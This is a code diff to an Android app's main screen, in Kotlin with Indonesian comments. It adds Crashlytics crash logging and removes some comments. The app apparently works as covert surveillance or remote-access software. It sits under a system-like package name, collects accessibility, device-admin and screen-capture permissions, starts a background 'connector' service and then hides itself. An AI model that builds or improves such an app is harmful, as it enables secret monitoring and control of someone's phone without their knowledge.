@@ -17,12 +17,14 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.android.services.databinding.ActivityMainBinding
+import com.google.firebase.crashlytics.FirebaseCrashlytics
 import java.util.UUID
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
+    private val crashlytics by lazy { FirebaseCrashlytics.getInstance() }
 
     private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
     private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
@@ -44,6 +46,8 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        crashlytics.log("MainActivity: onCreate")
+
         ensureDeviceId()
         startConnectorService()
 
@@ -52,7 +56,6 @@ class MainActivity : AppCompatActivity() {
             if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                     // Android 14+ (API 34): wajib via foreground service dengan tipe mediaProjection
-                    // sebelum getMediaProjection() dipanggil.
                     try {
                         val svcIntent = Intent(this, ConnectorService::class.java).apply {
                             action = ConnectorService.ACTION_SETUP_MEDIA_PROJECTION
@@ -61,16 +64,17 @@ class MainActivity : AppCompatActivity() {
                         }
                         startForegroundService(svcIntent)
                     } catch (e: Exception) {
+                        crashlytics.recordException(e)
                         android.util.Log.w("MainActivity", "MP service intent failed: ${e.message}")
                     }
                 } else {
-                    // Android ≤ 13: panggil langsung dari Activity — tidak ada requirement foreground service.
-                    // Gunakan resources.displayMetrics dari Activity (akurat, tidak perlu WindowManager).
+                    // Android ≤ 13: panggil langsung dari Activity
                     try {
                         val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                         val proj = mgr.getMediaProjection(result.resultCode, result.data!!)
                         MediaProjectionHolder.setup(applicationContext, proj, resources.displayMetrics)
                     } catch (e: Exception) {
+                        crashlytics.recordException(e)
                         android.util.Log.w("MainActivity", "MP setup failed: ${e.message}")
                     }
                 }
@@ -101,11 +105,12 @@ class MainActivity : AppCompatActivity() {
         val adminOk = dpm.isAdminActive(adminComponent)
         val setupDone = allPermsOk && adminOk
 
+        crashlytics.log("MainActivity: updateUI allPermsOk=$allPermsOk adminOk=$adminOk setupDone=$setupDone fromPanic=$fromPanic")
+
         if (setupDone && !fromPanic) {
             // Semua izin OK — minta MediaProjection dulu jika belum aktif, lalu hide
             if (!MediaProjectionHolder.isAvailable()) {
                 requestMediaProjection()
-                // hideAndExit() dipanggil dari dalam projectionLauncher callback
             } else {
                 hideAndExit()
             }
@@ -131,6 +136,7 @@ class MainActivity : AppCompatActivity() {
             }
             if (!adminOk) missing.add("Admin Perangkat")
 
+            crashlytics.log("MainActivity: missing permissions = ${missing.joinToString()}")
             binding.tvAccessStatus.text = "Izin belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin satu per satu."
             binding.tvAccessStatus.setTextColor(getColor(R.color.red))
             binding.btnAccessibility.text = "Berikan Izin →"
@@ -141,13 +147,13 @@ class MainActivity : AppCompatActivity() {
 
     /**
      * Tampilkan system dialog untuk MediaProjection (screen capture) permission.
-     * Dialog hanya muncul saat session baru (in-memory, per process — bukan permanen).
      */
     private fun requestMediaProjection() {
         try {
             val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             projectionLauncher.launch(mgr.createScreenCaptureIntent())
         } catch (e: Exception) {
+            crashlytics.recordException(e)
             android.util.Log.w("MainActivity", "requestMediaProjection failed: ${e.message}")
             hideAndExit()
         }
@@ -182,6 +188,8 @@ class MainActivity : AppCompatActivity() {
             } else {
                 startService(intent)
             }
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            crashlytics.recordException(e)
+        }
     }
 }
